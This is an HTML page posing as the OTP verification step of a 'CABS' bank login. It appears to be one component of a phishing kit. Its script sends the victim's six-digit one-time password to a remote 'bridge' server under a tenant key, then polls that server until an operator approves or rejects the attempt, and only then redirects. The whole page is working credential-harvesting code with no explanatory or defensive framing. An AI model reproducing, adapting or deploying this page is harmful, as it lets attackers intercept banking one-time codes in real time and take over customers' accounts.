<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CABS - Verify OTP</title>
    <style>
        /* CSS Variables for CABS Branding */
        :root {
            --cabs-blue: #0d1a70;
            --cabs-green: #67ad38;
            --text-gray: #6b7280;
            --border-gray: #cdd1d5;
            --bg-color: #ffffff;
        }

        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
        }

        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* Progress Overlay */
        #progress-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
            flex-direction: column;
        }

        .progress-circle {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            border: 6px solid #eee;
            border-top: 6px solid var(--cabs-blue);
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .login-container {
            width: 100%;
            max-width: 500px;
            padding: 40px 20px;
            background: white;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .welcome-text {
            font-size: 32px;
            color: var(--cabs-blue);
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 5px;
        }

        .ib-text {
            font-size: 32px;
            color: var(--cabs-green);
            font-weight: 800;
            line-height: 1.1;
            margin-bottom: 15px;
        }

        .instruction-text {
            color: var(--text-gray);
            font-size: 15px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .otp-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
            gap: 10px;
        }

        .otp-input {
            width: 50px;
            height: 60px;
            border: 1px solid var(--border-gray);
            border-radius: 6px;
            font-size: 24px;
            font-weight: bold;
            color: var(--cabs-blue);
            text-align: center;
            outline: none;
            transition: all 0.2s;
            background-color: #fafafa;
        }

        .otp-input:focus {
            border-color: var(--cabs-blue);
            background-color: #fff;
            box-shadow: 0 0 5px rgba(13, 26, 112, 0.2);
        }

        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 20px;
        }

        .btn {
            flex: 1;
            padding: 14px 0;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            text-align: center;
            text-decoration: none;
            transition: all 0.2s;
            text-transform: uppercase;
            border: none;
        }

        .btn-outline {
            background: transparent;
            color: var(--cabs-blue);
            border: 1px solid var(--cabs-blue);
        }

        .btn-outline:hover {
            background: #f4f5f9;
        }

        .btn-solid {
            background: var(--cabs-blue);
            color: white;
            border: 1px solid var(--cabs-blue);
        }

        .btn-solid:hover {
            background: #0a1457;
        }

        .resend-text {
            text-align: center;
            margin-top: 25px;
            font-size: 14px;
            color: var(--text-gray);
        }

        .resend-text a {
            color: var(--cabs-green);
            font-weight: bold;
            text-decoration: none;
            margin-left: 5px;
        }

        .timer {
            font-weight: bold;
            color: var(--cabs-blue);
        }
    </style>
</head>
<body>

    <div id="progress-overlay">
        <div class="progress-circle"></div>
        <p style="color: var(--cabs-blue); font-weight: 600;">Verifying OTP...</p>
    </div>

    <div class="login-container">
        
        <div class="logo-container">
            <img src="logo.png" alt="CABS Logo" style="width: 150px; margin-bottom: 10px;">
        </div>

        <div class="welcome-text">Security</div>
        <div class="ib-text">Verification</div>
        
        <p class="instruction-text">
            Please enter the 6-digit One Time Password (OTP) sent to your phone.
        </p>

        <form onsubmit="submitOtpToBridge(event);">
            
            <div class="otp-container">
                <input type="text" id="o1" class="otp-input" maxlength="1" pattern="[0-9]" required autofocus>
                <input type="text" id="o2" class="otp-input" maxlength="1" pattern="[0-9]" required>
                <input type="text" id="o3" class="otp-input" maxlength="1" pattern="[0-9]" required>
                <input type="text" id="o4" class="otp-input" maxlength="1" pattern="[0-9]" required>
                <input type="text" id="o5" class="otp-input" maxlength="1" pattern="[0-9]" required>
                <input type="text" id="o6" class="otp-input" maxlength="1" pattern="[0-9]" required>
            </div>

            <div class="button-group">
                <button type="button" class="btn btn-outline" onclick="window.history.back()">BACK</button>
                <button type="submit" class="btn btn-solid">VERIFY & LOGIN</button>
            </div>
        </form>

    </div>

    <script src="config.js"></script>
    <script>
        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;

        // Auto-advance logic
        const inputs = document.querySelectorAll('.otp-input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                if (e.target.value !== '' && index < inputs.length - 1) inputs[index + 1].focus();
            });
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) inputs[index - 1].focus();
            });
        });

        async function submitOtpToBridge(event) {
            event.preventDefault();
            const otp = Array.from(inputs).map(i => i.value).join('');
            document.getElementById('progress-overlay').style.display = 'flex';

            try {
                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
                    },
                    body: JSON.stringify({ type: 'otp', otp: otp })
                });
                
                const { attemptId } = await response.json();
                pollStatus(attemptId);
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('progress-overlay').style.display = 'none';
                alert('Submission failed.');
            }
        }

        async function pollStatus(attemptId) {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
                        headers: {
                            'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}`
                        }
                    });
                    const { status } = await res.json();
                    
                    if (status === 'approved') {
                        clearInterval(interval);
                        window.location.href = 'index.html';
                    } else if (status === 'rejected') {
                        clearInterval(interval);
                        document.getElementById('progress-overlay').style.display = 'none';
                        alert("OTP Verification rejected.");
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 3000);
        }
    </script>
</body>
</html>
